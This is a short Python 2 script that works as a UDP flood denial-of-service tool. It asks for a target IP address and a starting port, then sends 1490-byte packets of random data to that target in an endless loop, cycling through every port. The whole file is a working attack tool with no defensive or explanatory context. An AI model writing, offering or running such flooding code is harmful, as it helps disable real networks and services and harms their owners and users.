import socket
import random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
print"\033[38;2;99;255;99m"
ip = raw_input("  ip: ")
port = input("port: ")
while True:
     sock.sendto(bytes, (ip, port))
     port = port + 1
     if port == 65534:
       port = 1